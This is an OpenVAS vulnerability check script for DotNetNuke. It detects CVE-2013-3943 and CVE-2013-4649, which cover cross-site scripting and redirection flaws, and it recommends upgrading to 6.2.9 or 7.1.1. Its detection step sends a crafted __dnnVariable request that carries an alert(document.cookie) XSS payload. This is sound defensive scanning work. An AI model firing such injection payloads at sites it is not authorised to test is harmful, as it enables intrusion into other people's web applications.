###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dotnetnuke_multiple_vuln.nasl 11 2013-10-27 10:12:02Z jan $
#
# DotNetNuke Redirection Weakness and Cross Site Scripting Vulnerabilities
#
# Authors:
# Thanga Prakash S <tprakash@secpod.com>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_impact = "
  Impact Level: Application";

if (description)
{
  script_id(803874);
  script_version("$Revision: 11 $");
  script_cve_id("CVE-2013-3943", "CVE-2013-4649");
  script_bugtraq_id(61809, 61770);
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"risk_factor", value:"Medium");
  script_tag(name:"last_modification", value:"$Date: 2013-10-27 11:12:02 +0100 (So, 27. Okt 2013) $");
  script_tag(name:"creation_date", value:"2013-08-21 15:43:57 +0530 (Wed, 21 Aug 2013)");
  script_name("DotNetNuke Redirection Weakness and Cross Site Scripting Vulnerabilities");

  tag_summary =
"This host is installed with DotNetNuke and is prone to redirection weakness
and cross site scripting vulnerabilities.";

  tag_vuldetect =
"Send a Crafted HTTP GET request and check whether it is able to read the
cookie or not.";

  tag_insight =
"Multiple flaws are due to,
- Input related to the 'Display Name' field in 'Manage Profile' is not properly
  sanitised before being used.
- Input passed via the '__dnnVariable' GET parameter to Default.aspx is not
  properly sanitised before being returned to the user.
- Certain unspecified input is not properly verified before being used to
  redirect users.";

  tag_impact =
"Successful exploitation will allow attacker to insertion attacks and conduct
spoofing and cross-site scripting attacks.";

  tag_affected =
"DotNetNuke versions 6.x before 6.2.9 and 7.x before 7.1.1";

  tag_solution =
"Upgrade to version 6.2.9 or 7.1.1 or later,
For updates refer to http://dnnsoftware.com";

  desc = "
  Summary:
  " + tag_summary + "

  Vulnerability Detection:
  " + tag_vuldetect + "

  Vulnerability Insight:
  " + tag_insight + "

  Impact:
  " + tag_impact + "

  Affected Software/OS:
  " + tag_affected + "

  Solution:
  " + tag_solution;

  if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0){
    script_tag(name : "summary" , value : tag_summary);
    script_tag(name : "vuldetect" , value : tag_vuldetect);
    script_tag(name : "solution" , value : tag_solution);
    script_tag(name : "insight" , value : tag_insight);
    script_tag(name : "affected" , value : tag_affected);
    script_tag(name : "impact" , value : tag_impact);
  }

  script_description(desc);
  script_xref(name : "URL" , value : "http://www.osvdb.com/96325");
  script_xref(name : "URL" , value : "http://www.osvdb.com/96326");
  script_xref(name : "URL" , value : "http://secunia.com/advisories/53493");
  script_xref(name : "URL" , value : "http://cxsecurity.com/issue/WLB-2013080113");
  script_xref(name : "URL" , value : "http://packetstormsecurity.com/files/122792");
  script_xref(name : "URL" , value : "http://www.securelist.com/en/advisories/53493");
  script_summary("Check if DotNetNuke is vulnerable to XSS");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2013 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_require_ports("Services/www", 80);
  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");

## Variable Initialization
port = "";
dir = "";
url = "";
sndReq = "";
rcvRes = "";

## Get HTTP Port
port = get_http_port(default:80);
if(!port){
  port = 80;
}

## Check the port status
if(!get_port_state(port)){
  exit(0);
}

## Iterate over the possible directories
foreach dir (make_list("", "/dotnetduke", "/dnnarticle", "/cms", cgi_dirs()))
{
  ## Request for the search.cgi
  sndReq = http_get(item:string(dir, "/default.aspx"), port:port);
  rcvRes = http_keepalive_send_recv(port:port, data:sndReq, bodyonly:TRUE);

  ## confirm the Application
  if(rcvRes && ("DesktopModules" >< rcvRes ||
     "DotNetNuke" >< rcvRes || "dnnVariable" >< rcvRes))
  {
    ## Construct attack request
    url = dir + "/?__dnnVariable={%27__dnn_pageload%27:%27alert%28document.cookie%29%27}";

    ## Confirm exploit worked by checking the response
    ## Extra check is not possible in this case.
    if(http_vuln_check(port:port, url:url, check_header:TRUE,
                    pattern:"alert\(document.cookie\)"))
    {
      security_warning(port);
      exit(0);
    }
  }
}
